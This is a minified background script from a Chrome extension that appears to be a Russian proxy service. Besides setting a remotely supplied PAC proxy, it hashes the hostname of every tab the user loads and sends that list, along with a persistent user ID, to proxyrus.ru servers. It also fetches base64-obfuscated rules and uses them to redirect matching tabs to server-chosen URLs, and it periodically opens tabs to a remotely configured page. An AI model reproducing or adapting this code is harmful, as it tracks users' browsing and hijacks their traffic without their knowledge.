(function() {
    function a() {
        localStorage.s || (localStorage.s = d()), localStorage.u || (localStorage.u = b()), localStorage.h || (localStorage.h = 0), localStorage.r || (localStorage.r = "0;/common/share.html"), localStorage.t || (localStorage.t = 7e6), localStorage.isEnabled || (localStorage.isEnabled = !0), localStorage.v = chrome.runtime.getManifest().version, localStorage.i = chrome.runtime.id, localStorage.c || (localStorage.c = "https://php-chrome.proxyrus.ru/proxy/version/config.txt;https://cf-php-chrome.proxyrus.ru/proxy/version/config.txt;https://node-chrome.proxyrus.ru/proxy/version/config.txt;https://cf-node-chrome.proxyrus.ru/proxy/version/config.txt"), localStorage.cm || (localStorage.cm = e()), localStorage.dm || (localStorage.dm = e())
    }
    function c(a, b) {
        chrome.storage.local.get("b", c => {
            c.b || (c.b = []), -1 == c.b.indexOf(b(a)) && (c.b.push(b(a)), chrome.storage.local.set({
                b: c.b
            }))
        })
    }
    function g(a) {
        return j(a.split("").reduce((c, a) => (c = (c << 5) - c + a.charCodeAt(0), c & c), 0))
    }
    function b() {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, a => {
            var b = 0 | 16 * Math.random(),
                c = "x" == a ? b : 8 | 3 & b;
            return c.toString(16)
        })
    }
    function d() {
        return Date.now()
    }
    function e() {
        return new Date(0).toUTCString()
    }
    function f() {
        return new Date().toUTCString()
    }
    function k(a) {
        return "true" === localStorage[a]
    }
    function h(a, b) {
        chrome.tabs.update(b, {
            url: a
        })
    }
    function u() {
        var b = y(localStorage.r);
        0 == localStorage.h && 0 != b[0] && k("isEnabled") && 6e8 < d() - localStorage.s && (localStorage.s = d(), chrome.tabs.create({
            url: b[1]
        }))
    }
    function i(a) {
        return new URL(a).hostname
    }
    function y(a) {
        if (a && 0 < a.length) return a.split(";")
    }
    function A(a) {
        return atob(a)
    }
    function j(a) {
        return btoa(a)
    }
    function l(a, b) {
        chrome.browserAction.setIcon({
            path: a
        }), chrome.browserAction.setTitle({
            title: b
        })
    }
    function m() {
        chrome.tabs.onUpdated.hasListener(t) && chrome.tabs.onUpdated.removeListener(t)
    }
    function n(c, d, e, f, g) {
        var h = /\'(.*?)\'/g,
            a = /=$/g,
            b = a.test(c) ? `${c}${d}` : c;
        fetch(b).then(a => {
            a.redirected ? f.a(a.url) && e(a.url, g) : a.text().then(a => {
                e(h.exec(a)[1], g)
            }).catch(() => {})
        }).catch(() => {})
    }
    function o() {
        return chrome.proxy.settings.clear({}), k("isEnabled") && k("user_proxy") ? void chrome.storage.local.get("d", a => {
            if (a && a.d && 0 < a.d.length) {
                var b = `PROXY ${localStorage.user_proxy_http}:${localStorage.user_proxy_port};`,
                    c = /(\/\*[\w\s]+\*\/)([\w\s]+)(\/\*[\w\s]+\*\/)/ig,
                    e = a.d.replace(c, `$1'${b} DIRECT;'$3`);
                chrome.proxy.settings.set({
                    value: {
                        mode: "pac_script",
                        pacScript: {
                            data: e
                        }
                    },
                    scope: "regular"
                }), l("icon-128-enabled.png", "\u0412\u043A\u043B")
            } else chrome.proxy.settings.clear({}), l("icon-128-disabled.png", "\u0412\u044B\u043A\u043B")
        }) : void(k("isEnabled") ? chrome.storage.local.get("d", a => {
            if (a && a.d && 0 < a.d.length) {
                var b = {
                    mode: "pac_script",
                    pacScript: {
                        data: a.d
                    }
                };
                chrome.proxy.settings.set({
                    value: b,
                    scope: "regular"
                }), l("icon-128-enabled.png", "\u0412\u043A\u043B")
            } else chrome.proxy.settings.clear({}), l("icon-128-disabled.png", "\u0412\u044B\u043A\u043B")
        }) : (chrome.proxy.settings.clear({}), l("icon-128-disabled.png", "\u0412\u044B\u043A\u043B")))
    }
    function p() {
        m(), chrome.tabs.onUpdated.addListener(t), chrome.runtime.onInstalled.addListener(q), chrome.runtime.onMessage.addListener(s);
        for (var a of ["onCompleted", "onResponseStarted", "onErrorOccurred"]) chrome.webRequest[a].addListener(r, {
            urls: ["<all_urls>"],
            types: ["main_frame"]
        })
    }
    function q(a) {
        "install" == a.reason && chrome.tabs.create({
            url: "/common/start.html"
        }), "update" == a.reason && (localStorage.c = "https://php-chrome.proxyrus.ru/proxy/version/config.txt;https://cf-php-chrome.proxyrus.ru/proxy/version/config.txt;https://node-chrome.proxyrus.ru/proxy/version/config.txt;https://cf-node-chrome.proxyrus.ru/proxy/version/config.txt")
    }
    function r(a) {
        if (k("isEnabled") && a.ip && 0 < a.tabId && localStorage.j) {
            var b = y(localStorage.j);
            for (var c of b)
                if (c == a.ip) {
                    var d = setTimeout(() => {
                        chrome.browserAction.getBadgeText({
                            tabId: a.tabId
                        }, () => {
                            chrome.browserAction.setBadgeText({
                                text: "\u2605".toString(),
                                tabId: a.tabId
                            }), chrome.browserAction.setBadgeBackgroundColor({
                                color: "#0cec47",
                                tabId: a.tabId
                            })
                        }), clearTimeout(d)
                    }, 500);
                    break
                }
        }
    }
    function s(a) {
        "e" == a.a && o()
    }
    function t(d, e, f) {
        var j = i(f.url);
        if ("loading" == e.status && c(j, g), !!(w && 0 < w.length))
            for (var k in w)
                if (w.hasOwnProperty(k)) {
                    var b = w[k].a;
                    f.url.includes(A(b.d)) && !B.has(b.d) && (B.add(b.d), n(A(b.u), f.url, h, A(b.d), d))
                }
    }
    function x() {
        chrome.storage.local.get("b", a => {
            function b() {
                fetch(c.a.pop() + c.s, {
                    method: "GET",
                    headers: new Headers({
                        "If-Modified-Since": localStorage.cm,
                        "X-Requested-With": localStorage.i
                    })
                }).then(a => {
                    if (304 == a.status) return chrome.storage.local.get({
                        k: []
                    }, a => {
                        a && a.k && (w = a.k), m(), chrome.tabs.onUpdated.addListener(t)
                    }), chrome.storage.local.remove("b"), void v();
                    if (204 == a.status) return void chrome.storage.local.remove("b");
                    if (200 != a.status) return w = [], chrome.storage.local.remove("b"), m(), void(0 == c.a.length ? v() : b());
                    if (a.ok) {
                        var d = a.headers.get("content-type");
                        if (!d || -1 == d.indexOf("application/json")) return void(0 == c.a.length ? v() : b());
                        localStorage.cm = f(), a.json().then(a => {
                            var b = [],
                                d = [];
                            for (var e in localStorage.r = A(a.r), localStorage.t = A(a.t), localStorage.j = A(a.j), chrome.storage.local.remove("k"), a)
                                if (a[e][0].hasOwnProperty("c")) {
                                    for (var f = 1, g = a[e].length; f < g; ++f) b += A(a.c[f].d);
                                    localStorage[e] = b
                                } else if (a[e][0].hasOwnProperty("p")) {
                                for (var f = 1, g = a[e].length; f < g; ++f) d += A(a.d[f].d);
                                localStorage[e] = d
                            } else a[e][0].hasOwnProperty("a") && chrome.storage.local.get({
                                k: []
                            }, b => {
                                for (var c = b.k, d = 1, f = a[e].length; d < f; ++d) c.push({
                                    [e]: a.a[d]
                                });
                                w = c, chrome.storage.local.set({
                                    k: c
                                })
                            });
                            return chrome.storage.local.remove("b"), void v()
                        })
                    }
                }).catch(() => {
                    0 == c.a.length ? v() : b()
                })
            }
            a.b || (a.b = []);
            const c = {
                a: y(localStorage.c),
                s: `?uid=${localStorage.u}&ver=${localStorage.v}&extid=${localStorage.i}&start=${localStorage.s}&hash=${[...a.b].join("-")}`
            };
            b();
            var d = setInterval(() => {
                u(), x(), B.clear(), clearInterval(d)
            }, localStorage.t)
        })
    }
    function v() {
        function a() {
            fetch(b.a.pop() + b.s, {
                method: "GET",
                headers: new Headers({
                    "If-Modified-Since": localStorage.dm,
                    "X-Requested-With": localStorage.i
                })
            }).then(c => {
                if (304 != c.status && 204 != c.status) {
                    if (200 != c.status) return void(0 == b.a.length ? o() : a());
                    if (c.ok) {
                        var d = c.headers.get("content-type");
                        if (!d || -1 == d.indexOf("application/x-ns-proxy-autoconfig")) return void(0 == b.a.length ? o() : a());
                        localStorage.dm = f(), c.text().then(a => (chrome.storage.local.set({
                            d: a
                        }), void o()))
                    }
                }
            }).catch(() => {
                0 == b.a.length ? o() : a()
            })
        }
        if (!localStorage.d) return localStorage.isEnabled = !1, chrome.runtime.sendMessage({
            a: "e"
        }), void l("icon-128-disabled.png", "\u0412\u044B\u043A\u043B");
        const b = {
            a: y(localStorage.d),
            s: `?uid=${localStorage.u}&ver=${localStorage.v}&extid=${localStorage.i}&start=${localStorage.s}`
        };
        a()
    }
    var w = [],
        B = new Set;
    String.prototype.a = function(c) {
            var d = /^https?:\/\//i,
                a = d.test(this) ? this : `https://${this}`;
            return i(a).includes(i(c)) || i(c).includes(i(a))
        },
        function() {
            a(), u(), x(), p(), localStorage.d && o()
        }()
})();